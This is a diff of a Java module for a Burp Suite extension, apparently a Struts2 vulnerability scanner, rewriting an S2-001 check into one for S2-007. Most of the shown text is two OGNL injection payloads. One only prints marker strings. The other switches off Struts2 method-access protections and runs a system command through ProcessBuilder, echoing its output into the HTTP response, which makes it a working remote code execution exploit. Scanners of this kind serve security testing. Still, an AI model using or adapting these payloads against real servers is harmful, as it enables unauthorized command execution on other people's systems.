@@ -1,23 +1,26 @@
-package module.java.vul;
+package module;
 
 import burp.*;
-import module.Util;
 
 import java.net.URLEncoder;
-import java.util.Arrays;
 import java.util.List;
 
-public class S2_001 extends IModule {
+public class S2_007 extends IModule {
     public String poc =
-        "%{" +
+        "'+(" +
+        "#_memberAccess.allowStaticMethodAccess=true," +
+        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
         "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
         "#f.getWriter().print(\"" + injectMark[0] + "\")," +
         "#f.getWriter().print(\"" + injectMark[1] + "\")," +
         "#f.getWriter().flush()," +
         "#f.getWriter().close()" +
-        "}";;
+        ")+'";
+
     public String exp =
-        "%{" +
+        "'+(" +
+        "#_memberAccess.allowStaticMethodAccess=true," +
+        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
         "#a=(new java.lang.ProcessBuilder(\"whoami\")).redirectErrorStream(true).start()," +
         "#b=#a.getInputStream()," +
         "#c=new java.io.InputStreamReader(#b)," +
@@ -27,7 +30,8 @@ public class S2_001 extends IModule {
         "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
         "#f.getWriter().print(new java.lang.String(#e))," +
         "#f.getWriter().flush()," +
-        "#f.getWriter().close()}";
+        "#f.getWriter().close()" +
+        ")+'";
 
     @Override
     public IScanIssue start() {
@@ -44,6 +48,4 @@ public class S2_001 extends IModule {
         }
         return null;
     }
-
-
 }
